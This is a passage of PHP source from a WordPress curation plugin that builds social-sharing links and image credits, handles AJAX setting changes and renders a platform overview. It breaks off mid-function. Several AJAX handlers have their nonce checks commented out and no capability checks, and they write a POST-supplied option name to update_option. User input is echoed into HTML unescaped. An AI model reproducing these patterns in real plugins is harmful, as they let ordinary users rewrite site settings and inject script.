function getTwitterUserNameFromTwitterString($lookForTwitter)
{
    $FoundTwitterUserName = '';
    $lookForTwitter = preg_replace('/(http:\/\/|https:\/\/|www.|twitter.com\/share|statuses\/\w*|twitter.com)/i', '', $lookForTwitter);

    //we stripped twitter.com and all bad twitter.com/URLS, now let's look for more bad stuff
    // these are def bad URLS
    $badURLStrings = array('home?status', '/intent/', '?status=', 'search.', 'share?', 'text=', '.rss');
    $foundBadURL = false;
    foreach ($badURLStrings as $value) {
        if (strpos($lookForTwitter, $value) !== false) {
            return '';
        }
    }

    // there are possible finds for users
    // /status/, /statuses/

    // checking to see if the Twitter username is valid
    if (preg_match('/\/[a-z|0-9|_]*/i', $lookForTwitter, $matches)) {
        $lookForTwitter = $matches[0];
        //yeah we might have found  user now let's remove the / that should still be there
        $lookForTwitter = str_replace('/', '', $lookForTwitter);

        if (strpos($lookForTwitter, '/') === false)
            $FoundTwitterUserName = $lookForTwitter;

    }
    // we found a user let's do one more check
    if (strlen($FoundTwitterUserName) > 0)
        return $FoundTwitterUserName;
    else
        return '';

}

/*
 * This function loads the social media actions text. Essentially it scours the post content looking for bolded, italic, and  headlines to create unique social updates
 *
 * @since 1.1 Curaiton Suite
 *
 * @return string|json response with html string that has all the action links for social sharing.
 */

function ybi_curation_suite_social_meta_load()
{

//	if( wp_verify_nonce($_POST['load_social_media_actions_nonce'], 'load_social_media_actions_nonce'))
    {
        // get the post content, title, ide and social text if needed
        $post_content = trim($_POST['post_content']);
        $title = trim($_POST['title']);
        $post_id = trim($_POST['post_id']);
        $social_action_text = ($_POST['social_action_text']);
        $social_text_location = ($_POST['social_text_location']);
        $ignore_social_options = ($_POST['ignore_social_options']);
        $load_co_schedule = ($_POST['load_co_schedule']) == 'true';

        $permalink = get_permalink($post_id);
        $permalink_raw = $permalink;
        $return_content = '';
        $all_list_arr = array();
        $all_list_arr[] = $title;
        require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");
        $html = new curationsuite\simple_html_dom();

        // we create an html page from the content that will be parsed
        $thecontent = '<html><body>' . $post_content . '</body></html>';
        // now let's reload the content to easily read it
        $html->load($thecontent);

        // these are the elements we search.
        $ignore_links = false;
        if ($ignore_social_options) {
            $elements_to_find = array();
            if (!in_array('bold', $ignore_social_options)) {
                $elements_to_find[] = 'b';
                $elements_to_find[] = 'strong';
            }
            if (!in_array('headlines', $ignore_social_options)) {
                $elements_to_find[] = 'h2';
                $elements_to_find[] = 'h3';
                $elements_to_find[] = 'h4';
                $elements_to_find[] = 'h5';
                $elements_to_find[] = 'h6';
            }
            if (in_array('links', $ignore_social_options))
                $ignore_links = true;

        } else {
            $elements_to_find = array('b', 'strong', 'h2', 'h3', 'h4', 'h5', 'h6');
        }

        // loop thru array of list elements and create list arrays
        $list_arr = array();
        $single_arr = array();
        // loop thru each element and add just the text to on array
        foreach ($elements_to_find as $val) {
            $single_arr = $html->find($val);
            if (!empty($single_arr)) {
                $list_combined = '';
                $i = 0;
                foreach ($single_arr as $one_line) {
                    $all_list_arr[] = $one_line->plaintext;
                }
            }
        }
        $twitter_urls_arr = array();
        $elements_to_find = array('div[data-wpview-text]');
        foreach ($elements_to_find as $val) {
            $single_arr = $html->find($val);
            if (!empty($single_arr)) {
                $list_combined = '';
                $i = 0;
                foreach ($single_arr as $one_line) {
                    if ($one_line->tag == 'div') {
                        $twitter_url = stripcslashes(urldecode($one_line->attr['data-wpview-text']));
                        // for some reason this link has "(double quotes) around it, so we remove it
                        $twitter_url = str_replace('"', '', $twitter_url);
                        $twitter_urls_arr[] = $twitter_url;
                    }
                }
            }

        }
        $elements_to_find = array('a');
        foreach ($elements_to_find as $val) {
            $single_arr = $html->find($val);
            if (!empty($single_arr)) {
                foreach ($single_arr as $one_line) {
                    // add the text to links
                    if (!$ignore_links)
                        $all_list_arr[] = $one_line->plaintext;

                    $href = $one_line->attr['href'];
                    if (strpos($href, 'twitter.com') !== false) {
                        $twitter_url = stripcslashes($one_line->attr['href']);
                        // for some reason this link has "(double quotes) around it, so we remove it
                        $twitter_url = str_replace('"', '', $twitter_url);
                        $twitter_urls_arr[] = $twitter_url;
                    }
                }
            }
        }
        $content_twitter_users_arr = array();
        foreach ($twitter_urls_arr as $twitter_url) {
            $twitter_username = getTwitterUserNameFromTwitterString($twitter_url);
            if ($twitter_username != '')
                $content_twitter_users_arr[] = $twitter_username;
        }


        // now we return the sharing elements
        $return_content .= '<table class="wp-list-table widefat fixed posts" cellspacing="0">';
        $i = 1;
        $alternate = '';
        $update_text = '';
        $permalink = urlencode($permalink);

        foreach ($all_list_arr as $one_line) {
            if (0 != $i % 2): $alternate = ' alternate'; endif;
            // this combines the text fround with the text entered (if any) by the user
            $end_social_text = '';
            if ($social_text_location == 'before') {
                $update_text = $one_line . ' ' . $social_action_text;
                $update_text_raw = $one_line . ' ' . $social_action_text;
            } else {
                $update_text = $one_line;
                $update_text_raw = $one_line;
                $end_social_text = ' ' . $social_action_text;
            }


            $update_text = html_entity_decode(trim($update_text), 0, 'UTF-8');
            $update_text = urlencode($update_text);

            $return_content .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '">
				<td class="post-title page-title column-title link_bucket_text">' . stripslashes($update_text_raw) . ' - ' . $permalink_raw . $end_social_text;

            // here we just provide an easy way to copy for co-schedule with {permalink}
            if ($load_co_schedule)
                $return_content .= '<span class="co_schedule_copy"><strong>CoSchedule: </strong>' . stripslashes($update_text_raw) . ' - {permalink}</span>';

            $return_content .= '</td><td class="ybi_cu_social_actions">
			<a href="http://hootsuite.com/hootlet/load?title=' . $update_text . urlencode($end_social_text) . '&address=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('youbrandinc_products/i/hootsuite-icon_24.png') . '" /></a>
			<a href="http://bufferapp.com/bookmarklet/?text=' . $update_text . urlencode($end_social_text) . '&url=' . $permalink . '" target="_blank" class="buffer"><img class="buffer_share" src="' . plugins_url('youbrandinc_products/i/buffer-logo.png') . '" /></a>
			<a href="http://www.twitter.com/home?status=' . ($update_text . urlencode($end_social_text) . ' - ' . $permalink . $end_social_text) . '" target="_blank" class="twitter"><i class="fa fa-twitter fa-2x"></i></a>
			<a href="http://www.facebook.com/sharer.php?s=100&p[title]=' . $update_text . urlencode($end_social_text) . '&p[url]=' . $permalink . '" target="_blank" class="facebook"><i class="fa fa-facebook fa-2x"></i></a>
			<a href="http://www.linkedin.com/shareArticle?mini=true&title=' . $update_text . urlencode($end_social_text) . '&url=' . $permalink . '" target="_blank" class="linkedin"><i class="fa fa-linkedin fa-2x"></i></a>
			<a href="https://plus.google.com/share?url=' . $permalink . '" target="_blank" class="googleplus"><i class="fa fa-google-plus fa-2x"></i></a>
			<a href="http://www.tumblr.com/share?v=3&u=' . $permalink . '&title=' . $update_text . urlencode($end_social_text) . '" target="_blank" class="tumblr"><i class="fa fa-tumblr fa-2x"></i></a>
			</td></tr>';
            $i++;
            $alternate = '';
        }

        $this_twitter_user_arr = array();
        //$current_data = get_post_meta( $post_id, 'cu_twitter_data', false );  // get the existing urls, this returns an array

        if ($content_twitter_users_arr) {
            $i = 1;
            $alternate = '';
            $return_content .= '<tr><td colspan="2"><b>Twitter Updates</b></td></tr>';
            foreach ($content_twitter_users_arr as $twitter_username) {
                if (0 != $i % 2): $alternate = ' alternate'; endif;
                if (!in_array($twitter_username, $this_twitter_user_arr)) {

                    /*					$update_text = $title . ' ' . $social_action_text;
					$update_text_raw = $title . ' ' . $social_action_text;*/

                    $end_social_text = '';
                    if ($social_text_location == 'before') {
                        $update_text = $title . ' ' . $social_action_text;
                        $update_text_raw = $title . ' ' . $social_action_text;
                    } else {
                        $update_text = $title;
                        $update_text_raw = $title;
                        $end_social_text = ' ' . $social_action_text;
                    }

                    $update_text = html_entity_decode(trim($update_text), 0, 'UTF-8');
                    $update_text = urlencode($update_text . ' with @' . $twitter_username);

                    $return_content .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '">
				<td class="post-title page-title column-title link_bucket_text">' . stripslashes($update_text_raw) . ' - ' . $permalink_raw . ' with @' . $twitter_username . urlencode($end_social_text);
                    $return_content .= '</td><td class="ybi_cu_social_actions">
			<a href="http://hootsuite.com/hootlet/load?title=' . $update_text . urlencode($end_social_text) . '&address=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('youbrandinc_products/i/hootsuite-icon_24.png') . '" /></a>
			<a href="http://bufferapp.com/bookmarklet/?text=' . $update_text . urlencode($end_social_text) . '&url=' . $permalink . '" target="_blank" class="buffer"><img class="buffer_share" src="' . plugins_url('youbrandinc_products/i/buffer-logo.png') . '" /></a>
			<a href="http://www.twitter.com/home?status=' . ($update_text . ' - ' . $permalink . urlencode($end_social_text)) . '" target="_blank" class="twitter"><i class="fa fa-twitter fa-2x"></i></a>
			</td></tr>';
                    $this_twitter_user_arr[] = $twitter_username;
                    $i++;
                    $alternate = '';
                }
            }

        }
        $return_content .= '</table>';
        if (isset($html) || empty($html) || is_object($html)) {
            $html->clear();  // **** very important ****
            unset($html);    // **** very important ****
        }
        echo json_encode(array('results' => $return_content));

    }
    die();
}

add_action('wp_ajax_ybi_curation_suite_social_meta_load', 'ybi_curation_suite_social_meta_load');


function ybi_cu_filePath($filePath)
{
    $fileParts = pathinfo($filePath);

    if (!isset($fileParts['filename'])) {
        $fileParts['filename'] = substr($fileParts['basename'], 0, strrpos($fileParts['basename'], '.'));
    }

    return $fileParts;
}

/*
 * This loads the image credit text
 *
 *
 * @since 1.1
 *
 * @return string|json response with html string that contains the action links to add content to post box
 */

function ybi_curation_suite_image_credit_load()
{

//	if( wp_verify_nonce($_POST['load_social_media_actions_nonce'], 'load_social_media_actions_nonce'))
    {
        // get the post content, title, ide and social text if needed
        $post_content = trim($_POST['post_content']);
        $title = trim($_POST['title']);
        $post_id = trim($_POST['post_id']);
        $image_credit_value_one = ($_POST['image_credit_value_one']);
        $image_credit_value_two = ($_POST['image_credit_value_two']);
        // this is here because we added a feature to the post area that does a quick add.
        $text_return_type = ($_POST['text_return_type']);

        //$permalink = get_permalink( $post_id );
        $return_content = '';
        $all_list_arr = array();

        // only include if function not found
        //if(!function_exists('file_get_html'))
        require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");
        // create a simple html dom file
        $html = new curationsuite\simple_html_dom();

        // we create an html page from the content that will be parsed
        $thecontent = '<html><body>' . $post_content . '</body></html>';
        // now let's reload the content to easily read it
        $html->load($thecontent);

        // these are the elements we search.
        $elements_to_find = array('img');
        // loop thru array of list elements and create list arrays
        $list_arr = array();
        $single_arr = array();
        $all_images_arr = array();
        // loop thru each element and add just the text to on array
        foreach ($elements_to_find as $val) {
            $single_arr = $html->find($val);
            if (!empty($single_arr)) {
                $list_combined = '';
                $i = 0;
                foreach ($single_arr as $one_line) {
                    // the alt text holds the full link attribution
                    $cleanURL = $one_line->getAttribute('alt');
                    // for some reason we get extra slashes and double quotes, this cleans those
                    $cleanURL = stripslashes($cleanURL);
                    $cleanURL = str_replace("\"", "", $cleanURL);
                    // next get the image src of the image and apply the same urls
                    $theSRC = $one_line->getAttribute('src');
                    $theSRC = stripslashes($theSRC);
                    $theSRC = trim(str_replace("\"", "", $theSRC));


                    if ($cleanURL != "") {
                        // we add the  urls to a array
                        $all_list_arr[] = $cleanURL;
                        $filenameArr = ybi_cu_filePath($theSRC); // get the filename arr so we can use it
                        $filename = $filenameArr['filename'] . '.' . $filenameArr['extension']; // create just the file name
                        $all_images_arr[] = array('domain' => ybi_cu_getDomainName($cleanURL), 'filename' => $filename); // add an array with the domain and the filename to an overall array
                    }
                }
            }

        }
        // now we return the sharing elements
        $return_content .= '<div>';
        $i = 1;
        $alternate = '';
        $combinedText = '';
        $isPlural = false;
        // if there is more than one image then the text should be pluralized
        if (count($all_images_arr) > 1)
            $isPlural = true;

        // these are the lower case tex values
        $image_credit_value_one_lc = strtolower($image_credit_value_one);
        $image_credit_value_one_plural = $image_credit_value_one . 's'; // add a s to set it to plural
        $combinedBeginningText = '';

        // check if the text needs to be plural, if so we add a s to the keywords
        if ($isPlural)
            $combinedBeginningText = $image_credit_value_one_plural;
        else
            $combinedBeginningText = $image_credit_value_one;

        $combinedBeginningText .= ' ' . $image_credit_value_two . ' ';

        $image_credit_value_one_lc = strtolower($image_credit_value_one);

        $uniqueSourceDomainsArr = array();
        $addToUnique = true;
        $domainName = '';
        $seperator = '';
        $justDomains = '';
        $creditTextImagePar = '';
        $individualCreditsCombined = '';
        $individualCreditsSingle = '';
        $creditTextParentheses = '';
        /**
         *** The below loop does quite a bit. Basically since we have the images and domains into a multi array we loop thru them creating a series of credit text
         *** Each loop adds to all the individual updates and at the end we display the results
         **/
        foreach ($all_images_arr as $oneImage) {
            // if we have more than one image from the same source we only want to cite it once in the domain listing
            if (in_array($oneImage['domain'], $uniqueSourceDomainsArr))
                $addToUnique = false;

            // for combined credits we want to seperate them with either a line break or commmas
            if ($i > 1):
                $combinedText .= '<br />';
                $creditTextParentheses .= ', ';
                $creditTextImagePar .= ', ';
                if ($addToUnique)
                    $justDomains .= ', ';
            endif;

            if ($addToUnique) {
                $justDomains .= $oneImage['domain'];
                $uniqueSourceDomainsArr[] = $oneImage['domain'];
            }
            $combinedText .= $oneImage['filename'] . ' ' . $image_credit_value_one_lc . ' ' . $image_credit_value_two . ' ' . $oneImage['domain'];
            $creditTextParentheses .= $oneImage['filename'] . ' (' . $oneImage['domain'] . ')';
            $creditTextImagePar .= '(' . $oneImage['filename'] . ') ' . $oneImage['domain'];
            $individualCreditsSingle = $oneImage['filename'] . ' ' . $image_credit_value_one_lc . ' ' . $image_credit_value_two . ' ' . $oneImage['domain'];
            $individualCreditsCombined .= '<p>' . $individualCreditsSingle . ' <a href="javascript:;" class="add_raw_text_to_post" rel="' . $individualCreditsSingle . '" name="individual_credit"><i class="fa fa-plus-circle"></i> add</a></p>';
            $i++;
            $addToUnique = true;
            //combinedText$combinedTextRel  .= $oneImage['filename'] . ' ' . $image_credit_value_one . ' ' . $image_credit_value_two . ' ' . $oneImage['domain'] . '<br>';

        }
        // this might take a little bit to decipher but basically each image attribution has it's own section
        // we use the rel attribute in the href to hold the text that should be copied.
        // we also use the name to signifiy which element is added so we can display the right add to post indication to the user
        // all of this is added to the return_content var
        $justDomainsSimple = $combinedBeginningText . $justDomains;
        $justDomains = $combinedBeginningText . $justDomains . ' <a href="javascript:;" class="add_raw_text_to_post" rel="' . $combinedBeginningText . $justDomains . '" name="only_domains"><i class="fa fa-plus-circle"></i> add</a>';
        $return_content .= '<h3>Only Domains <span class="credit_added only_domains"><i class="fa fa-plus"></i> Credit Added</a></span></h3><p>' . $justDomains . '</p>';

        $creditTextParentheses = $combinedBeginningText . $creditTextParentheses . ' <a href="javascript:;" class="add_raw_text_to_post" rel="' . $combinedBeginningText . $creditTextParentheses . '" name="image_name_domain"><i class="fa fa-plus-circle"></i> add</a>';
        $return_content .= '<h3>Image Name & Domain <span class="credit_added image_name_domain"><i class="fa fa-plus"></i> Credit Added</a></span></h3><p>' . $creditTextParentheses . '</p>';

        $creditTextImagePar = $combinedBeginningText . $creditTextImagePar . ' <a href="javascript:;" class="add_raw_text_to_post" rel="' . $combinedBeginningText . $creditTextImagePar . '" name="image_name_domain"><i class="fa fa-plus-circle"></i> add</a>';
        $return_content .= '<p>' . $creditTextImagePar . '</p>';

        $combinedText .= ' <a href="javascript:;" class="add_raw_text_to_post" rel="' . $combinedText . '" name="single_line_combined"><i class="fa fa-plus-circle"></i> add</a>';
        $return_content .= '<h3>Single Line Combined  <span class="credit_added single_line_combined"><i class="fa fa-plus"></i> Credit Added</a></span></h3><p>' . $combinedText . '</p>';

        $combinedText = str_replace('<br />', ', ', $combinedText);
        $return_content .= '<p>' . $combinedText . '</p>';

        $return_content .= '<h3>Individual Credits <span class="credit_added individual_credit"><i class="fa fa-plus"></i> Credit Added</a></span></h3>' . $individualCreditsCombined;

        $return_content .= '</div>';
        if (isset($html) || empty($html) || is_object($html)) {
            $html->clear();  // **** very important ****
            unset($html);    // **** very important ****
        }

        // very inneffecient at this time, so it needs to be reworked but had to ship
        if($text_return_type=='simple') {
            echo json_encode(array('results' => $justDomainsSimple));
        } else {
            echo json_encode(array('results' => $return_content));
        }



    }
    die();
}

add_action('wp_ajax_ybi_curation_suite_image_credit_load', 'ybi_curation_suite_image_credit_load');


function ybi_curation_suite_platform_setting_change()
{
    $current_setting = trim($_POST['current_setting']);
    $current_setting_type = trim($_POST['current_setting_type']);
    if ($current_setting_type == 'checkbox')
        $current_value = trim($_POST['current_value']) == 'true';
    else
        $current_value = sanitize_text_field($_POST['current_value']);


    update_option($current_setting, $current_value);
    echo json_encode(array('current_setting' => $current_setting, 'current_value' => $current_value, 'message' => 'Setting has been updated'));
    die();
}

add_action('wp_ajax_ybi_curation_suite_platform_setting_change', 'ybi_curation_suite_platform_setting_change');


function ybi_curation_suite_platform_defaults_change()
{
    $platform_id = trim($_POST['platform_id']);
    $topic_id = trim($_POST['topic_id']);
    $time_frame = trim($_POST['time_frame']);
    $article_sort = trim($_POST['social_sort']);
    $video_sort = trim($_POST['video_sort']);
    $platform_sources = trim($_POST['platform_sources']);
    $value_arr = array('platform_id', $platform_id, 'topic_id', $topic_id, 'time_frame', $time_frame, 'article_sort', $article_sort, 'video_sort', $video_sort, 'platform_sources', $platform_sources);
    $update_value = implode(':', $value_arr);

    update_option('ybi_cs_platform_defaults', $update_value);
    echo json_encode(array('status' => 'saved'));
    die();
}

add_action('wp_ajax_ybi_curation_suite_platform_defaults_change', 'ybi_curation_suite_platform_defaults_change');

/**
 * This function will change a setting value basically like setting a switch. This is a local setting
 * It gets these values from the ajax call.
 * current_setting = the setting name
 * whether or not it's set or not
 * selected_view is so we know what to do after
 *
 * @since 1.40
 */
function ybi_curation_suite_settings_change()
{
    $current_setting = trim($_POST['current_setting']);
    $current_value = trim($_POST['current_value']) == 'true';
    $selected_view = trim($_POST['selected_view']);

    update_option($current_setting, $current_value);
    echo json_encode(array('current_setting' => $current_setting, 'current_value' => $current_value, 'message' => 'Setting has been updated', 'selected_view' => $selected_view));
    die();
}
add_action('wp_ajax_ybi_curation_suite_settings_change', 'ybi_curation_suite_settings_change');

/**
 * This function will change a setting value basically like setting a switch. This is a local setting
 * It gets these values from the ajax call.
 * current_setting = the setting name
 * whether or not it's set or not
 * selected_view is so we know what to do after
 *
 * @since 1.40
 */
function ybi_curation_suite_meta_setting_change()
{
    $current_setting = trim($_POST['current_setting']);
    $current_value_type = trim($_POST['current_value_type']);
    if($current_value_type=='checkbox') {
        $current_value = trim($_POST['current_value']) == 'true';
    } else {
        $current_value = trim($_POST['current_value']);
    }


    $selected_view = trim($_POST['selected_view']);
    $post_id = trim($_POST['post_id']);
    update_post_meta( $post_id, $current_setting, $current_value );

    echo json_encode(array('current_setting' => $current_setting, 'current_value' => $current_value, 'message' => 'Setting has been updated', 'selected_view' => $selected_view));
    die();
}

add_action('wp_ajax_ybi_curation_suite_meta_setting_change', 'ybi_curation_suite_meta_setting_change');


function ybi_create_link($link, $text, $blank = true)
{
    if ($blank)
        return '<a href="' . $link . '" target="_blank">' . $text . '</a>';
    else
        return '<a href="' . $link . '">' . $text . '</a>';
}

function cs_common_on_off_text($in_val, $reverse = false)
{
    $return_text = '';
    if (intval($in_val)) {
        if ($in_val > 0)
            $return_text = 'On';
        else
            $return_text = 'Off';
    } else {
        $return_text = 'Off';
    }
    if ($reverse) {
        if ($return_text == 'On')
            $return_text = 'Off';
        else
            $return_text = 'On';
    }
    return $return_text;

}

function cs_le_load_platform_setup()
{
    $platform_id = trim($_POST['platform_id']);
    $send_data = array('platform_id' => $platform_id);
    $parm_url_arr = array('get-platform-topics-sources', $platform_id, 'full');
    $return_data = ybi_curation_suite_api_call('', $send_data, $parm_url_arr);
    $platform = $return_data['results'];
    $keyword_total = 0;
    $rss_total = 0;
    $topic_total = 0;
    $html = '';

    $status = $return_data['status'];
    $message = '';
    $keyword_max = 24;
    $rss_max = 60;

    $topic_html = '';
    $i = 0;
    $topic_dd_html = '<label>Topic:</label><select id="le_topic_for_feed" name="le_topic_for_feed" class="cu_mid_opt">';
    $tabs_html = '<ul id="platform_setup_tabs">';

    $tabs_html .= '<li><a href="#platform_overview"><i class="fa fa-cogs"></i> Overview</a></li>';
    $tabs_html .= '<li><a href="#new_topic_actions"><i class="fa fa-th-list cs_new_topic_fa"></i> New Topic</a></li>';
    $tabs_html .= '<li><a href="#new_feed_actions"><i class="fa fa-rss-square cs_rss"></i> New Feed</a></li>';
    $tabs_html .= '<li><a href="#negative_keywords"><i class="fa fa-search-minus"></i> Narratives & Negative Keywords</a></li>';


    if (count($return_data['results']['topics']) > 0) {
        foreach ($return_data['results']['topics'] as $topic) {

            $platform_topic_name = $topic['platform_topic_name'];
            $rss_total += $topic['rss_source_count'];
            $keyword_total += $topic['keyword_count'];
            $name = '';
            if ($platform_topic_name)
                $name = $platform_topic_name . ' (' . $topic['name'] . ')';
            else
                $name = $topic['name'];

            $tabs_html .= '<li class="topic_tab_' . $topic['id'] . '"><a href="#topic_' . $topic['id'] . '"><i class="fa fa-th-list"></i> <span class="topic_name_tab_title_' . $topic['id'] . '">' . $name . '</span></a></li>';

            $topic_html .= '<div id="topic_' . $topic['id'] . '" class="platform_topic_info">';
            $topic_html .= cs_le_html_get_topic_detail($topic);

            $topic_html .= '</div>';
            $topic_dd_html .= '<option value="' . $topic['id'] . '">' . $name . '</option>';
            $topic_total++;
            $i++;
        }
    }
    $topic_dd_html .= '</select>';

    $html = '
<div style="text-align: center;"><p><span class="current_platform_name">' . $platform['platform_name'] . '</span> Platform : Topics: <span class="current_total_topics">' . $topic_total . '</span> of ' . $platform['topic_limit'] . ' - Feeds:  <span class="current_total_feeds" style="font-weight: bold;">' . $rss_total . '</span> of ' . $platform['feed_limit'] . ' - Keywords: <span class="current_total_keywords">' . $keyword_total . '</span> of ' . $platform['keyword_limit'] . '</p></div>
<div id="platform_setup_results">';
    $over_view_html = '<div id="platform_edit_message"></div>';
    $over_view_html .= '<div id="platform_overview">';

    $show_limit_notice = false;
    if ($topic_total > $platform['topic_limit'] || $keyword_total > $platform['keyword_limit'] || $rss_total > $platform['feed_limit'])
        $show_limit_notice = true;

    $Table = new ybi\html\Table(
        'platform_overview_table',
        array('wp-list-table', 'widefat', 'fixed posts'),
        array('alternate' => true, 'tbody_class' => 'overview_body'));


    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('left_platform_setting');
    $Row->addColumn($Column);
    $Column = new ybi\html\Column('right_platform_setting');
    $Row->addColumn($Column);
    $Table->setTitleRow($Row);

    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('', array(), array('colspan' => 2));
    $Column->setContent('<h3>Platform Overview</h3>');
    $Row->addColumn($Column);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('', array('platform_setting_name'));
    $Column->setContent('Platform Name');
    $Row->addColumn($Column);

    $Column = new ybi\html\Column('', array('platform_setting_value'));
    $Link = new ybi\html\Link('edit_platform_name', array('edit_platform_name_link'), array(), array('data-platform-id' => $platform['id']), '', '<i class="fa fa-pencil-square-o"></i>edit name');
    $Column->setContent('<span id="current_platform_name_master">' . $platform['platform_name'] . '</span> <span class="cs_platform_name_edit">' . $Link->getJavaScriptLink() . '</span>');
    $Row->addColumn($Column);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Total Topics', '', array('platform_setting_name'));
    $Row->addColumnContent('<span class="current_total_topics">' . $topic_total . '</span> of ' . $platform['topic_limit']);
    $Table->addRow($Row);


    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Total Keywords', '', array('platform_setting_name'));
    $Row->addColumnContent('<span class="current_total_keywords">' . $keyword_total . '</span> of ' . $platform['keyword_limit']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Total Feeds/Sites:', '', array('platform_setting_name'));
    $Row->addColumnContent('<span class="current_total_feeds">' . $rss_total . '</span> of ' . $platform['feed_limit']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Purchase Date', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['purchase_date']);
    $Table->addRow($Row);


    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Main Email', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['main_email_address']);
    $Table->addRow($Row);

    if ($show_limit_notice) {
        $notice_text = '<p><i>Please note: If your platform currently has more topics/keywords/feeds than your subscription limit then you\'re platform was setup before our self management was released.
You are free to edit or modify your Listening Engine within the limitations of your current subscription level. If you are over the keyword or feed limit in order to add or modify your topics you\'ll have to remove unwanted keywords or feeds.
You can also upgrade to a larger Listening Engine subscription-- see the Upgrades tab for more information.</i>
</p>';
        $Row = new ybi\html\Row('', array());
        $Row->addColumnContent($notice_text, '', array(), array('colspan' => 2));
        $Table->addRow($Row);

    }
    $Row = new ybi\html\Row('', array());
    $Column = new ybi\html\Column('', array(), array('colspan' => 2));
    $Column->setContent('<h3>Platform & Subscription Information</h3>');
    $Row->addColumn($Column);
    $Table->addRow($Row);

    $PlatformLevel = $platform['PlatformLevel'];
    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Platform Level', '', array('platform_setting_name'));
    $Row->addColumnContent($PlatformLevel['level_name']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Subscription Type', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['platform_subscription_type']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Topic Limit', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['topic_limit']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Keyword Limit', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['keyword_limit']);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Subscription/Feed Limit', '', array('platform_setting_name'));
    $Row->addColumnContent($platform['feed_limit']);
    $Table->addRow($Row);

    $toggle_status = 'on';
    $toggle_icon = '<i class="fa fa-toggle-on cs_good"></i>';
    if ($platform['summary_email_active'] != 1) {
        $toggle_status = 'off';
        $toggle_icon = '<i class="fa fa-toggle-off notice_red"></i>';
    }
    $Link = new ybi\html\Link('', array('cs_le_feature_toggle'), array(), array('data-platform-id' => $platform['id'], 'data-feature-name' => 'summary_email_active', 'data-feature-status' => $toggle_status), '', $toggle_icon);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Daily Email Digest Status:', '', array('platform_setting_name'));
    $Row->addColumnContent('<span class="cs_toggle_wrapper">' . $Link->getJavaScriptLink() . '</span>');
    $Table->addRow($Row);

    $real_time_text = '';
    if ($platform['is_real_time'] == 0)
        $real_time_text = 'Off - See Upgrades tab for more information on this feature.';
    else
        $real_time_text = 'On';

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('Real Time Feature', '', array('platform_setting_name'));
    $Row->addColumnContent($real_time_text);
    $Table->addRow($Row);

    $Row = new ybi\html\Row('', array());
    $Row->addColumnContent('News Feature', '', array('platform_setting_name'));
    if ($platform['allow_news_feature'] == 1) {
        $Row->addColumnContent('<p>News View ID: ' . $platform['id'] . '</p>
		<p><strong>shortcode:</strong><br /> [curation-suite-display-platform view="' . $platform['id'] . '" brick_width="300" show_date="no" show_source="yes"][/curation-suite-display-platform]</p>
		<p class="cs_help_link"><a href="https://curationsuite.com/help/news-page-feature" target="_blank" class="">Shortcode Help/Tutorials</a></p><br />
		<p><strong><i class="fa fa-rss-square" aria-hidden="true"></i> News RSS Feed:</strong><br />
		<a href="https://curationwp.com/feeds/news-page-feed/?view_id=' . $platform['id'] . '" title="News Page RSS Feed" target="_blank">
		https://curationwp.com/feeds/news-page-feed/?view_id=' . $platform['id'] . '</a></p>
		<p class="cs_help_link"><a href="https://curationsuite.com/help/news-curated-rss-feed-help" target="_blank" class="">News Feed Help/Tutorials</a></p>
		');


    } else {
        $Row->addColumnContent('Not activated, contact to request this feature to be turned on.');
    }
    $Table->addRow($Row);


    $over_view_html .= $Table->getFullTableHTML();

    $over_view_html .= '</div>';

    $new_topic_html = '<div id="new_topic_actions">';
    $new_topic_html .= '<h2>Add New Topic ' . cs_html_get_tutorial_link('OEbYHuOIFNE', 'New Topic Tutorial') . '</h2>
<div id="add_new_topic_message"></div>
	        <div class="listing_form_element" id="new_blank_topic_w">
            <label>Topic Name/Title</label>
            <input type="text" name="new_topic_name" value="" id="new_topic_name" class="regular-text form-control" />
            <a href="javascript:;" class="add_topic_btn button-primary action" rel="url_sources_body">Add New Blank Topic</a>
        	</div>
        	<hr />
  <h2>Search & Add From Master Topics ' . cs_html_get_tutorial_link('qSrYgmGS4jE', 'Adding Master Topic Tutorial') . '</h2>
<div class="input-group margin-bottom-sm" id="new_topic_search_w">
                    <span class="input-group-addon"><i class="fa fa-search fa-fw"></i></span>
                    <input type="text" name="le_search_topics" id="le_search_master_topic_keyword" class="regular-text form-control" />
            <a href="javascript:;" class="cs_le_search_master_topics_btn button action" rel="url_sources_body">Find Topic</a> <a href="javascript:;" class="clear_element" name="le_search_master_topic_keyword"><i class="fa fa-eraser"></i> clear</a>
        </div>
        <div id="cs_le_master_topic_search_results"></div>
        	</div>';

    /*$new_topic_html = '<div id="new_topic_actions">
    <p>Adding/Editing Topics and adding Master Topics will be added shortly...</p>
                </div>
        ';*/

    $new_feed_html = '<div id="new_feed_actions">';
    if ($topic_total == 0) {
